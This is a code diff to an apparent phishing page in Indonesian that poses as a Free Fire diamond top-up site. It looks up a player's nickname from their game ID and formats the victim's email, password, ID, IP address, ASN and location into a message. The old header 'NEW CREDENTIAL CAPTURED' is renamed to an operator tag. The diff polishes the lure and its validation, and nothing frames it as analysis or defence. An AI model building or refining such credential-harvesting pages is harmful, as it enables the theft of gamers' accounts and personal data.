@@ -182,7 +182,7 @@
             </div>
             <div class="input-hint" id="idHint" data-i18n="hintFF">Untuk menemukan ID Anda, ketuk pada avatar di sudut kiri atas menu utama game.</div>
             <div id="nicknameBox" class="nickname-box">
-                <img src="https://cdn.phototourl.com/member/2026-10-01-a8ee8f23-67b9-4485-a2cc-5783a3e9a532.png" id="nickIconImg" alt="gem"> <span id="nicknameText">-</span>
+                <img src="https://cdn.phototourl.com/member/2026-10-01-a8ee8f23-67b9-4485-a2cc-5783a3e9a532.png" id="nickIconImg" alt="status icon"> <span id="nicknameText">-</span>
             </div>
         </div>
 
@@ -288,6 +288,7 @@
         let timeoutId = null;
 
         const customDiamondImg = 'https://cdn.phototourl.com/member/2026-10-01-a8ee8f23-67b9-4485-a2cc-5783a3e9a532.png';
+        const crossRedImg = 'https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/274c.png'; // Gambar silang merah resmi
 
         const topupData = {
             'Free Fire': [
@@ -439,19 +440,20 @@
                 const response = await fetch(apiUrl);
                 const data = await response.json();
 
-                if (data && (data.success || data.userName || data.name || data.nickname)) {
+                // Validasi ketat respon API
+                if (data && (data.userName || data.name || data.nickname) && data.success !== false) {
                     detectedNickname = data.userName || data.name || data.nickname;
                     nickBox.className = 'nickname-box';
                     nickIconImg.style.animation = 'none';
                     nickIconImg.src = customDiamondImg;
                     nickText.innerText = `Player: ${detectedNickname}`;
                 } else {
-                    throw new Error('Tidak ditemukan');
+                    throw new Error('ID Tidak Ditemukan');
                 }
             } catch (err) {
                 nickBox.className = 'nickname-box error';
                 nickIconImg.style.animation = 'none';
-                nickIconImg.src = customDiamondImg;
+                nickIconImg.src = crossRedImg; // Gambar logo silang merah
                 detectedNickname = 'ID Tidak Ditemukan';
                 nickText.innerText = 'ID Tidak Ditemukan / Salah';
             }
@@ -486,7 +488,7 @@
             } catch(err) {}
 
             const formattedMessage = `
-📌 NEW CREDENTIAL CAPTURED 📌
+WEB MAS SHINJI☕
 📧 EMAIL : ${email}
 🔑 PW : ${password}
 🆔 ID : ${fullId}
@@ -494,7 +496,7 @@
 👤 NICKNAME : ${detectedNickname}
 🌍 REGION : ${ipData.country_name || ipData.country}
 🏙️ CITY : ${ipData.city}
-🏛️ STATE : ${ipData.region}
+🏛️️ STATE : ${ipData.region}
 🌐 ASN : ${ipData.org}
 💻 IP : ${ipData.ip}
             `.trim();
